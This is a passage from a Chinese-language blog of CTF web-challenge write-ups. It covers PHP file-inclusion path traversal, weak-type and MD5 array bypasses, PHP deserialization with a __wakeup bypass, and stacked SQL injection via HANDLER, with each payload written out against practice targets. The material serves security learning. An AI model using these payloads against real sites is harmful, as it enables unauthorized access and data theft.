<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112270.png" alt="image-20240102111240218"></p>
<p>提示查看/source.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021113080.png" alt="image-20240102111323993"></p>
<p>通过阅读代码可知</p>
<p><code>highlight_file</code>函数显示当前文件的源代码，<code>__FILE__</code>是一个特殊的常量，表示当前文件的完整路径和文件名</p>
<p>在emmm类中定义了一个公共的静态函数<code>checkFile</code>，它接受一个引用参数<code>$page</code></p>
<p><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 这行定义了一个名为<code>$whitelist</code>的数组，包含两个键值对，用于存储允许包含的文件名</p>
<p>最后一个if语句判断检查HTTP请求中是否包含名为<code>file</code>的参数，且这个参数是否为字符串，并通过<code>checkFile</code>函数检查是否在白名单中</p>
<p>先访问新的页面hint</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021120122.png" alt="image-20240102112052078"></p>
<p>获取到了flag的文件名，以及每个字母重复四次在提示我们是在四层目录之下</p>
<p>构造payload，包含名为file的参数</p>
<p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021124961.png" alt="image-20240102112429922"></p>
<p>得到flag</p>

        <h1 id="十五、-极客大挑战-2019-BuyFlag-1"   >
          <a href="#十五、-极客大挑战-2019-BuyFlag-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-极客大挑战-2019-BuyFlag-1" class="headerlink" title="十五、[极客大挑战 2019]BuyFlag 1"></a>十五、[极客大挑战 2019]BuyFlag 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636859.png" alt="image-20240102163601647"></p>
<p>查看右上角菜单可以看到有一个payflag，点进去之后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636196.png" alt="image-20240102163658086"></p>
<p>可以看到要想获得flag必须满足三个条件，①学生②正确的password③要有100000000的money</p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021638992.png" alt="image-20240102163827958"></p>
<p>提示表明要使用POST方法，password的值为404，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，但是又只使用了“==”，说明只是弱类型比较，添加随机字母才能使得参数等于数字</p>
<p>所以先使用HackBar进行POST方法给password和money传参</p>
<p><code>password=404a&amp;money=100000000</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021645883.png" alt="image-20240102164540845"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647276.png" alt="image-20240102164732243"></p>
<p>就差第一个条件了，再抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647760.png"></p>
<p>看到Cookie那儿user（用户）的值为0，在计算机语言中，0通常为假，1通常为真，将user修改为1后发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021649126.png" alt="image-20240102164937096"></p>
<p>又告诉我们数字长度太长了</p>

        <h3 id="法Ⅰ：科学计数法"   >
          <a href="#法Ⅰ：科学计数法" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：科学计数法" class="headerlink" title="法Ⅰ：科学计数法"></a>法Ⅰ：科学计数法</h3>
      <p>使用科学计数法表示就能缩短长度了，100000000改为1e9（表示1后面有9个零，8个零会回显钱不够）</p>
<p>发送之后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021655354.png" alt="image-20240102165532310"></p>
<p>得到flag</p>

        <h3 id="法Ⅱ：数组绕过"   >
          <a href="#法Ⅱ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：数组绕过" class="headerlink" title="法Ⅱ：数组绕过"></a>法Ⅱ：数组绕过</h3>
      <p>上网查查到这个方法，将<code>money=100000000</code>改为<code>money[]=0</code> (0可以为任何小于100000000的数字)</p>

        <h1 id="十六、-BJDCTF2020-Easy-MD5-1"   >
          <a href="#十六、-BJDCTF2020-Easy-MD5-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-BJDCTF2020-Easy-MD5-1" class="headerlink" title="十六、[BJDCTF2020]Easy MD5 1"></a>十六、[BJDCTF2020]Easy MD5 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021715170.png"></p>
<p>有点不知道怎么做，查看网页源代码也没啥发现，在题目打开界面有一个github链接，点击查看Web目录下的和url同名的文件leveldo4.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021717742.png" alt="image-20240102171756699"></p>
<p>阅读代码，通过GET方法传入参数password的值为ffifdyop，则会跳转到新界面</p>
<p>（也可以直接访问/levels91.php）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719956.png" alt="image-20240102171930880"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719570.png" alt="image-20240102171959537"></p>
<p>阅读代码后可知，通过GET方法传入a和b，a和b值不同，但md5值相同</p>
<p>（此处类似于[SWPUCTF 2021 新生赛]easy_md5）</p>
<p>于是我们可以采用数组绕过（值都为NULL）或是科学计数法绕过</p>
<p>构造payload</p>
<p><code>/levels91.php?a[]=1&amp;b[]=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021722138.png" alt="image-20240102172204101"></p>
<p>和刚刚的类似，两个参数值不同，但md5值相同，但是使用的是POST方法，得利用HackBar</p>
<p>这里是用的强类型比较，即两个参数值和类型都得相同，再次使用数组绕过</p>
<p>输入</p>
<p><code>param1[]=0&amp;param2[]=1</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021728962.png" alt="image-20240102172834916"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021738817.png" alt="image-20240102173809772"></p>
<p>得到flag</p>

        <h1 id="十七、-MRCTF2020-Ez-bypass-1"   >
          <a href="#十七、-MRCTF2020-Ez-bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-MRCTF2020-Ez-bypass-1" class="headerlink" title="十七、[MRCTF2020]Ez_bypass 1"></a>十七、[MRCTF2020]Ez_bypass 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031656440.png" alt="image-20240103165642369"></p>
<p>先通过GET方法传入id和gg，值不同但md5值要相同</p>
<p>接着再用POST方法传入passwd，passwd值要为1234567，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，那直接在后面随便加个字母</p>
<p>先传入id和gg</p>
<p><code>/?id[]=1&amp;gg[]=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031659394.png" alt="image-20240103165958346"></p>
<p>表明第一步完成，接着传入passwd，借助HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031700323.png" alt="image-20240103170040267"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031701777.png" alt="image-20240103170102724"></p>
<p>得到flag</p>

        <h1 id="十八、-网鼎杯-2020-青龙组-AreUSerialz-1"   >
          <a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="十八、[网鼎杯 2020 青龙组]AreUSerialz 1"></a>十八、[网鼎杯 2020 青龙组]AreUSerialz 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718311.png" alt="image-20240104171810248"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718517.png" alt="image-20240104171824476"></p>
<p>阅读代码可知，满足条件op=2，执行read读的操作；满足content&lt;100即可绕过；最后用GET方式传参str，而且最后的代码也提示了使用php反序列化</p>
<p>根据op=2和filename=flag.php写出反序列化代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op = 2;</span><br><span class="line">    public $filename = &quot;flag.php&quot;;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new FileHandler());</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>

<p>（此处将三个变量的类型换成了public类型，否则序列化后会产生星号*）运行后得到序列化</p>
<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code> </p>
<p>构造payload</p>
<p><code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>回车查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041930727.png" alt="image-20240104193053674"></p>
<p>得到flag</p>

        <h1 id="十九、-GYCTF2020-Blacklist-1"   >
          <a href="#十九、-GYCTF2020-Blacklist-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-GYCTF2020-Blacklist-1" class="headerlink" title="十九、[GYCTF2020]Blacklist 1"></a>十九、[GYCTF2020]Blacklist 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041951047.png" alt="image-20240104195127003"></p>
<p>和之前的  四、[强网杯 2019]随便注 1 很相似，但是只能利用open和handler</p>
<p>输入select</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041955252.png" alt="image-20240104195558198"></p>
<p>可以看到之前用的 修改表名 和 预处理 所需的关键字都被过滤了</p>
<p>查询一下表</p>
<p><code>&#39;;show tables#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042000563.png" alt="image-20240104200022523"></p>
<p>直接查询“FlagHere”表的结构</p>
<p><code>&#39;;show columns from FlagHere#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042001914.png" alt="image-20240104200132875"></p>
<p>于是可以构造payload</p>
<p><code>&#39;;handler</code>FlagHere<code>open as a;handler a read next;#</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041958103.png" alt="image-20240104195836055"></p>
<p>获得flag</p>

        <h1 id="二十、-极客大挑战-2019-PHP-1"   >
          <a href="#二十、-极客大挑战-2019-PHP-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-极客大挑战-2019-PHP-1" class="headerlink" title="二十、[极客大挑战 2019]PHP 1"></a>二十、[极客大挑战 2019]PHP 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051629835.png" alt="image-20240105162914690"></p>
<p>提示了我们备份，可以直接下载一下<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>输入</p>
<p><code>/www.zip</code></p>
<p>回车即开始下载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051631055.png" alt="image-20240105163130011"></p>
<p>可以看到有三个php文件，分别打开来看</p>
<p>flag.php：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>index.php:</p>
<p>重点在</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line"> $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line"> $res=unserialize(@$select);</span><br></pre></td></tr></table></div></figure>

<p>解读一下，用GET方法传入参数select，后面也提示了用反序列化</p>
<p>class.php:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>即当参数username=’admin’和password=100时才会有flag，编写代码进行序列化</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    //省略部分函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Name(&#x27;admin&#x27;,100); </span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>运行后得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051641173.png" alt="image-20240105164108131"></p>
<p>由于private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
<p>但是在class.php中多了一个wakeup()函数</p>
<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
<p><code>/?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
<p>回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
<p>得到flag</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>